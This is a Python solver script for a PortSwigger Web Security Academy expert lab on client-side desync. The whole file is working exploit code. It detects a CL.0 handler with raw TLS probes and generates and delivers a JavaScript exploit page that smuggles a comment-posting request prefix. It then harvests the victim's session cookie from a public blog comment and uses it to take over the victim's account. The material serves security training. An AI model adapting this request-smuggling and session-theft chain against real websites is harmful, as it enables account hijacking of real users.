#!/usr/bin/env python3
"""
PortSwigger Web Security Academy — Expert
"Client-side desync"

Objective: make the victim's browser disclose its session cookie through a
client-side desync (CSD), then use the stolen cookie to access the victim's
account (the lab flips to solved when that account is reached).

Vulnerability
-------------
`POST /` is answered with `302 Location: /<lang>` **without the server reading
the request body** (a CL.0-style handler). Because the same TCP/TLS connection
stays open, every byte the browser sent after the request head is left on the
socket and parsed as the *next request*. If that body is a request prefix with a
swollen `Content-Length`, the browser's next request is appended to it — that
request carries the victim's `Cookie` header, which ends up stored as a blog
comment (the "store text" gadget), where anyone can read it.

Chain:

  1. victim loads the exploit page on the exploit server
  2. JS does `fetch(POST /)` with a partially complete `POST /post/comment`
     request in the body (our own session + CSRF, so the comment is written)
  3. the server answers 302 without consuming the body -> connection desynced
  4. the follow-up fetch's raw request line + headers are appended to the
     comment body by the back-end -> the comment stores the victim's Cookie
  5. the solver reads the public comment, extracts `session=...`, and issues
     `GET /my-account` with it

Everything instance-specific (host, language prefix, post id, CSRF token,
exploit-server URL) is discovered at runtime.

Usage
-----
    uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net"
    uv run python solve.py --url <url> --force        # re-run when already solved
    uv run python solve.py --url <url> --wait 600     # longer victim queue window
    uv run python solve.py --url <url> --extra 800    # pin the Content-Length slack

Exit codes
----------
    0  verified solved (a stolen session reached the victim's account AND the
       lab widget reads is-solved)
    1  exploit failed / unverified
    2  lab unreachable or expired
    3  the instance does not behave like the vulnerable CL.0 handler
"""
from __future__ import annotations

import argparse
import json
import os
import random
import re
import socket
import ssl
import sys
import time
import urllib.parse
from pathlib import Path

import requests

HERE = Path(__file__).resolve().parent
LOG_DIR = HERE / "logs"
EVID_DIR = HERE / "evidence"

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/130.0.0.0 Safari/537.36")

# Content-Length slack after the form body. The appended browser request must
# reach the `Cookie:` header; Chrome's follow-up request is ~1.2 kB with the
# cookie sitting just past the half-way point, so ~800 is comfortably inside
# the window. The ladder gives a re-delivery a different alignment.
CL_EXTRA_LADDER = (800, 700, 950, 1100, 1300)


class LabError(Exception):
    """Fatal, user-facing solver error."""


class LabSolver:
    def __init__(self, url: str, *, wait: float, verbose: bool = False,
                 extra: int | None = None):
        parts = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
        if not parts.netloc:
            raise LabError(f"cannot parse lab URL: {url!r}")
        self.scheme = parts.scheme or "https"
        self.host = parts.netloc
        self.base = f"{self.scheme}://{self.host}"
        self.wait = wait
        self.verbose = verbose
        self.extras = (extra,) if extra else CL_EXTRA_LADDER
        self.requests = 0
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.prefix = ""          # "/en" on current instances
        self.post_id = "1"
        self.account_path = "/my-account"
        self.csrf = ""
        self.own_session = ""
        self.exploit_host = ""
        self.marker = "CSD" + "".join(random.choice("abcdefghjkmnpqrstuvwxyz23456789")
                                      for _ in range(8))

    # ------------------------------------------------------------------ plumbing
    def _note(self, msg: str) -> None:
        if self.verbose:
            print(f"    [dbg] {msg}")

    def get(self, path: str, *, params=None, session: requests.Session | None = None,
            allow_redirects: bool = True, note: str = "", timeout: float = 20.0):
        s = session or self.session
        url = path if path.startswith("http") else self.base + path
        self.requests += 1
        self._note(f"GET {url} {params or ''} {note}")
        try:
            return s.get(url, params=params, allow_redirects=allow_redirects,
                         timeout=timeout)
        except requests.RequestException as e:
            raise LabError(f"GET {url} failed: {e}") from e

    def post(self, path: str, data, *, session: requests.Session | None = None,
             allow_redirects: bool = True, note: str = "", timeout: float = 20.0):
        s = session or self.session
        url = path if path.startswith("http") else self.base + path
        self.requests += 1
        self._note(f"POST {url} {note}")
        try:
            return s.post(url, data=data, allow_redirects=allow_redirects,
                          timeout=timeout)
        except requests.RequestException as e:
            raise LabError(f"POST {url} failed: {e}") from e

    # -------------------------------------------------------------------- status
    def status_solved(self) -> bool:
        r = self.get("/", params={"csd": str(int(time.time() * 1000))},
                     note="lab status")
        if r.status_code >= 500:
            raise LabError(f"lab returned HTTP {r.status_code}")
        solved = "widgetcontainer-lab-status is-solved" in r.text
        if solved:
            self.record("lab_solved.html", r.text)
        return solved

    @staticmethod
    def strip_tags(html: str) -> str:
        return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", html)).strip()

    # ---------------------------------------------------------------- discovery
    def discover(self) -> None:
        r = self.get("/", allow_redirects=False, note="root redirect")
        loc = r.headers.get("Location", "")
        self.prefix = ""
        if loc.startswith("/") and len(loc) <= 12:
            self.prefix = loc.rstrip("/")
        self._note(f"language prefix: {self.prefix!r}")

        home = self.get(self.prefix + "/", note="home page")
        if home.status_code != 200:
            raise LabError(f"home page returned HTTP {home.status_code}")
        m = re.search(r'href=["\']([^"\']*?/post\?postId=(\d+))["\']', home.text)
        if not m:
            raise LabError("no blog post links found on the home page")
        self.post_id = m.group(2)
        self._note(f"post id: {self.post_id}")

    def discover_exploit_server(self) -> None:
        home = self.get(self.prefix + "/", note="home page (exploit link)")
        exp = re.search(r"id=['\"]exploit-link['\"][^>]*href=['\"]([^'\"]+)['\"]",
                        home.text)
        if not exp:
            exp = re.search(r"href=['\"]([^'\"]*exploit-server[^'\"]*)['\"]", home.text)
        if not exp:
            raise LabError("no exploit server link on the lab page — the lab "
                           "header hides #exploit-link once it is solved, so a "
                           "full re-run needs a fresh instance")
        self.exploit_host = exp.group(1).rstrip("/")
        self._note(f"exploit server: {self.exploit_host}")

    def own_comment_form(self) -> None:
        page = self.get(f"{self.prefix}/post", params={"postId": self.post_id},
                        note="post page (csrf + session)")
        if page.status_code != 200:
            raise LabError(f"post page returned HTTP {page.status_code}")
        m = re.search(r'name="csrf"\s+value="([^"]+)"', page.text)
        if not m:
            raise LabError("no CSRF token on the comment form")
        self.csrf = m.group(1)
        sess = self.session.cookies.get("session")
        if not sess:
            raise LabError("no session cookie after loading the post page")
        self.own_session = sess

    def discover_account_path(self) -> None:
        """The blog routes are language-prefixed; /my-account is not.

        Probe both shapes and keep the one that exists (anything but a 404);
        an anonymous visit answers 302 to /login.
        """
        for cand in (f"{self.prefix}/my-account", "/my-account"):
            r = self.get(cand, allow_redirects=False, note="probe account path")
            if r.status_code != 404:
                self.account_path = cand
                self._note(f"account path: {cand} ({r.status_code})")
                return
        raise LabError("no /my-account endpoint found on this instance")

    # ------------------------------------------------------------ vector probing
    def raw_probe(self, path: str, *, cl: int = 40, read_timeout: float = 3.0):
        """POST a request head with `Content-Length: cl` and no body.

        Returns (answered_early, status_line, elapsed, bytes_read). A CL.0
        handler answers without waiting for the declared body.
        """
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = (f"POST {path} HTTP/1.1\r\nHost: {self.host}\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {cl}\r\nConnection: keep-alive\r\n\r\n")
        self.requests += 1
        t0 = time.monotonic()
        try:
            sock = ctx.wrap_socket(socket.create_connection((self.host, 443), timeout=10),
                                   server_hostname=self.host)
        except OSError as e:
            raise LabError(f"cannot open TLS connection: {e}") from e
        data = b""
        try:
            sock.settimeout(read_timeout)
            sock.sendall(req.encode())
            while b"\r\n\r\n" not in data:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass
        elapsed = time.monotonic() - t0
        status = data.split(b"\r\n", 1)[0].decode("latin1") if data else ""
        answered = bool(status) and elapsed < read_timeout
        return answered, status, elapsed, len(data)

    def confirm_vector(self) -> None:
        answered, status, elapsed, n = self.raw_probe("/")
        print(f"[*] POST / with Content-Length: 40 and no body -> "
              f"{status or '(no response)'} in {elapsed:.2f}s")
        if not answered:
            raise LabError("POST / waited for the body — no CL.0 handler on this "
                           "instance (exit 3 path)")
        self.record("vector_root.txt",
                    f"POST / CL:40 no body\n{status}\nelapsed={elapsed:.3f}s "
                    f"bytes={n}\n")

        # Control: an ordinary endpoint must wait for its declared body.
        c_answered, c_status, c_elapsed, _ = self.raw_probe(
            f"{self.prefix}/post?postId={self.post_id}", read_timeout=2.5)
        print(f"[*] control POST {self.prefix}/post?postId={self.post_id} "
              f"-> {'answered ' + c_status if c_answered else 'waited (expected)'} "
              f"in {c_elapsed:.2f}s")
        if c_answered:
            print("[~] warning: the control endpoint also answered early; the "
                  "vector may be broader than expected")

    # ---------------------------------------------------------------- exploit page
    def build_exploit(self, extra: int) -> str:
        body = (f"csrf={self.csrf}&postId={self.post_id}&name={self.marker}"
                f"&email=a%40b.com&website=&comment=")
        smuggle = (f"POST {self.prefix}/post/comment HTTP/1.1\r\n"
                   f"Host: {self.host}\r\n"
                   f"Cookie: session={self.own_session}\r\n"
                   f"Content-Type: application/x-www-form-urlencoded\r\n"
                   f"Content-Length: {len(body) + extra}\r\n"
                   f"Connection: keep-alive\r\n\r\n{body}")
        follow = f"{self.prefix}/post?postId={self.post_id}"
        return f"""<html>
<body>
<script>
const LAB = {json.dumps(self.base)};
const SMUGGLED = {json.dumps(smuggle)};
fetch(LAB + "/", {{
    method: "POST",
    body: SMUGGLED,
    mode: "cors",
    credentials: "include"
}}).catch(() => {{
    fetch(LAB + {json.dumps(follow)}, {{ mode: "no-cors", credentials: "include" }});
}});
</script>
</body>
</html>
"""

    def store_exploit(self, page_html: str) -> str:
        head = "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8"
        data = {"responseFile": "/exploit", "urlIsHttps": "on",
                "responseHead": head, "responseBody": page_html,
                "formAction": "STORE"}
        r = self.post(self.exploit_host + "/", data, note="store exploit")
        if r.status_code != 200:
            raise LabError(f"exploit server store returned HTTP {r.status_code}")
        stored = self.get(self.exploit_host + "/exploit", note="read stored page")
        if stored.text != page_html:
            raise LabError("stored exploit page does not match what was posted "
                           f"({len(stored.text)} vs {len(page_html)} bytes)")
        print(f"[+] exploit page stored verbatim at {self.exploit_host}/exploit "
              f"({len(page_html)} bytes)")
        self.record("exploit_page.html", page_html)
        return stored.text

    def deliver(self, page_html: str) -> None:
        data = {"responseFile": "/exploit", "urlIsHttps": "on",
                "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
                "responseBody": page_html, "formAction": "DELIVER_TO_VICTIM"}
        r = self.post(self.exploit_host + "/", data, note="deliver to victim")
        if r.status_code != 200:
            raise LabError(f"exploit server delivery returned HTTP {r.status_code}")
        print("[+] exploit delivered to victim")

    # ------------------------------------------------------------------- harvest
    def comments(self) -> list[str]:
        r = self.get(f"{self.prefix}/post", params={"postId": self.post_id},
                     note="read comments")
        out = []
        for block in re.findall(r'<section class="comment">(.*?)</section>',
                                r.text, re.S):
            text = self.strip_tags(block)
            out.append(text)
        return out

    def harvest_cookie(self) -> str | None:
        for text in self.comments():
            if self.marker not in text:
                continue
            for m in re.finditer(r"session=([A-Za-z0-9]{16,64})", text):
                value = m.group(1)
                if value != self.own_session:
                    self.record("leaked_comment.txt", text)
                    return value
        return None

    # ----------------------------------------------------------------- assuming id
    def steal_account(self, cookie: str) -> bool:
        s = requests.Session()
        s.headers.update({"User-Agent": UA})
        s.cookies.set("session", cookie, domain=self.host)
        r = self.get(self.account_path, session=s,
                     allow_redirects=False, note="victim account")
        body = r.text.lower()
        authed = (r.status_code == 200
                  and "/login" not in r.headers.get("Location", "")
                  and ("your username" in body or "log out" in body
                       or "logout" in body or "update email" in body
                       or "my account" in body))
        who = re.search(r"Your username is:?\s*<[^>]*>?\s*([A-Za-z0-9_.@-]+)", r.text)
        print(f"[*] GET {self.account_path} with stolen session -> "
              f"HTTP {r.status_code}, authenticated={authed}"
              + (f", account={who.group(1)}" if who else ""))
        self.record("victim_account.html",
                    f"GET {self.account_path} -> {r.status_code} "
                    f"Location={r.headers.get('Location', '')}\n"
                    f"authenticated={authed}\n\n{self.strip_tags(r.text)[:1500]}\n")
        return authed

    # ------------------------------------------------------------------ reporting
    def record(self, name: str, text: str) -> None:
        if not EVID_DIR.exists():
            return
        try:
            (EVID_DIR / name).write_text(text, encoding="utf-8")
        except OSError:
            pass

    def report(self, elapsed: float, extra: dict) -> None:
        print(f"\n[=] elapsed: {elapsed:.1f}s | HTTP requests: {self.requests}")
        try:
            LOG_DIR.mkdir(exist_ok=True)
            (LOG_DIR / "last_run.json").write_text(json.dumps(
                {"base": self.base, "elapsed_s": round(elapsed, 2),
                 "requests": self.requests, "marker": self.marker, **extra},
                indent=2), encoding="utf-8")
        except OSError:
            pass

    # ----------------------------------------------------------------------- run
    def run(self, *, force: bool = False) -> int:
        t0 = time.monotonic()
        solved = self.status_solved()
        print(f"[*] lab widget before run: {'SOLVED' if solved else 'not solved'}")
        if solved and not force:
            print("[+] already solved — nothing to do (use --force to re-run)")
            self.report(time.monotonic() - t0, {"already_solved": True})
            return 0

        try:
            self.discover()
            self.discover_exploit_server()
        except LabError as e:
            if solved:
                print(f"[~] {e}")
                print("[+] lab widget reads is-solved (verified state)")
                self.report(time.monotonic() - t0, {"already_solved": True})
                return 0
            raise
        self.own_comment_form()
        self.discover_account_path()
        print(f"[*] our session: {self.own_session[:8]}… | csrf: {self.csrf[:8]}…")
        self.confirm_vector()

        for attempt, extra in enumerate(self.extras, 1):
            print(f"\n[*] attempt {attempt}/{len(self.extras)}: Content-Length slack "
                  f"+{extra} (marker {self.marker})")
            page = self.build_exploit(extra)
            self.store_exploit(page)
            self.deliver(page)

            deadline = time.monotonic() + self.wait
            last_note = 0.0
            while time.monotonic() < deadline:
                cookie = self.harvest_cookie()
                if cookie:
                    print(f"[+] victim session leaked into a public comment: "
                          f"{cookie[:8]}…")
                    if self.steal_account(cookie):
                        if self.status_solved():
                            print("[+] lab widget is-solved")
                            self.report(time.monotonic() - t0,
                                        {"solved": True, "extra": extra,
                                         "victim_session": cookie})
                            return 0
                        # keep polling: the checker may need a moment
                        last_note = time.monotonic()
                if self.status_solved():
                    print("[+] lab widget is-solved")
                    self.report(time.monotonic() - t0,
                                {"solved": True, "extra": extra})
                    return 0
                if time.monotonic() - last_note > 45:
                    last_note = time.monotonic()
                    print(f"    … still waiting for the victim "
                          f"({self.wait - (deadline - time.monotonic()):.0f}s)")
                time.sleep(5)
            print("[~] no leak within the wait window")

        print("[-] exploit failed: no victim cookie captured / account not reached")
        self.report(time.monotonic() - t0, {"solved": False})
        return 1


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Solve the 'Client-side desync' lab")
    ap.add_argument("--url", required=True, help="lab instance URL")
    ap.add_argument("--wait", type=float, default=300.0,
                    help="seconds to wait for the victim per delivery (default 300)")
    ap.add_argument("--extra", type=int, default=None,
                    help="pin the Content-Length slack instead of the ladder")
    ap.add_argument("--force", action="store_true", help="re-run even if solved")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args(argv)

    try:
        solver = LabSolver(args.url, wait=args.wait, verbose=args.verbose,
                          extra=args.extra)
        return solver.run(force=args.force)
    except LabError as e:
        msg = str(e)
        print(f"[-] {msg}", file=sys.stderr)
        code = 3 if ("CL.0" in msg or "does not behave" in msg) else 2
        return code
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
